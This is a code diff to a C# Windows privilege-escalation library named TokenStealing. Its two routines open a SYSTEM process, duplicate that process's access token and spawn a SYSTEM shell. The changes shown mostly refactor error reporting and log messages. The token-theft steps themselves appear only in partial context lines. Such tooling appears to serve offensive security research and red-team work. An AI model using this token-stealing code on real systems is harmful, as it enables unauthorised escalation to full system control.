@@ -11,6 +11,7 @@ namespace TokenStealing.Library
     {
         public static bool GetSystemBySecondaryLogon(bool fullPrivileged)
         {
+            int error;
             var hProcess = IntPtr.Zero;
             var hToken = IntPtr.Zero;
             var startupInfo = new STARTUPINFO
@@ -27,7 +28,7 @@ namespace TokenStealing.Library
 
             do
             {
-                if (Helpers.IsSystem(WindowsIdentity.GetCurrent().Token))
+                if (Helpers.IsSystem())
                 {
                     Console.WriteLine("[!] You already have SYSTEM privileges.");
                     status = true;
@@ -62,7 +63,7 @@ namespace TokenStealing.Library
 
                 if (hProcess == IntPtr.Zero)
                 {
-                    Console.WriteLine("[-] Failed to get handle from a SYSTEM process.");
+                    Console.WriteLine("[-] Failed to get valid handle from any SYSTEM processes.");
                     break;
                 }
                 else
@@ -74,15 +75,13 @@ namespace TokenStealing.Library
 
                 Console.WriteLine("[>] Trying to open process token.");
 
-                status = NativeMethods.OpenProcessToken(
-                    hProcess,
-                    ACCESS_MASK.TOKEN_DUPLICATE,
-                    out hToken);
+                status = NativeMethods.OpenProcessToken(hProcess, ACCESS_MASK.TOKEN_DUPLICATE, out hToken);
 
                 if (!status)
                 {
+                    error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to open process token.");
-                    Console.WriteLine(Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                     hToken = IntPtr.Zero;
                     break;
                 }
@@ -103,7 +102,9 @@ namespace TokenStealing.Library
 
                 if (!status)
                 {
+                    error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to duplicate primary token.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                     break;
                 }
                 else
@@ -147,8 +148,9 @@ namespace TokenStealing.Library
 
                 if (!status)
                 {
+                    error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to spawn SYSTEM shell.");
-                    Console.WriteLine(Marshal.GetLastWin32Error());
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                 }
                 else
                 {
@@ -178,6 +180,7 @@ namespace TokenStealing.Library
 
         public static bool GetSystemByTokenImpersonation(bool fullPrivileged)
         {
+            int error;
             var hProcess = IntPtr.Zero;
             var hToken = IntPtr.Zero;
             var startupInfo = new STARTUPINFO
@@ -196,7 +199,7 @@ namespace TokenStealing.Library
 
             do
             {
-                if (Helpers.IsSystem(WindowsIdentity.GetCurrent().Token))
+                if (Helpers.IsSystem())
                 {
                     Console.WriteLine("[!] You already have SYSTEM privileges.");
                     status = true;
@@ -223,7 +226,6 @@ namespace TokenStealing.Library
                     break;
                 }
 
-
                 Console.WriteLine("[>] Trying to get handle from a SYSTEM process.");
 
                 hProcess = Utilities.GetSystemProcessHandle(
@@ -235,7 +237,7 @@ namespace TokenStealing.Library
 
                 if (hProcess == IntPtr.Zero)
                 {
-                    Console.WriteLine("[-] Failed to get handle from a SYSTEM process.");
+                    Console.WriteLine("[-] Failed to get valid handle from any SYSTEM processes.");
                     break;
                 }
                 else
@@ -247,14 +249,13 @@ namespace TokenStealing.Library
 
                 Console.WriteLine("[>] Trying to open process token.");
 
-                status = NativeMethods.OpenProcessToken(
-                    hProcess,
-                    ACCESS_MASK.TOKEN_DUPLICATE,
-                    out hToken);
+                status = NativeMethods.OpenProcessToken(hProcess, ACCESS_MASK.TOKEN_DUPLICATE, out hToken);
 
                 if (!status)
                 {
+                    error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to open process token.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                     hToken = IntPtr.Zero;
                     break;
                 }
@@ -278,7 +279,9 @@ namespace TokenStealing.Library
 
                     if (!status)
                     {
+                        error = Marshal.GetLastWin32Error();
                         Console.WriteLine("[-] Failed to duplicate impersonation token.");
+                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                         break;
                     }
                     else
@@ -330,7 +333,9 @@ namespace TokenStealing.Library
 
                 if (!status)
                 {
+                    error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to duplicate primary token.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                     break;
                 }
                 else
@@ -376,8 +381,9 @@ namespace TokenStealing.Library
 
                 if (!status)
                 {
+                    error = Marshal.GetLastWin32Error();
                     Console.WriteLine("[-] Failed to spawn SYSTEM shell.");
-                    Console.WriteLine(Marshal.GetLastWin32Error());
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                 }
                 else
                 {
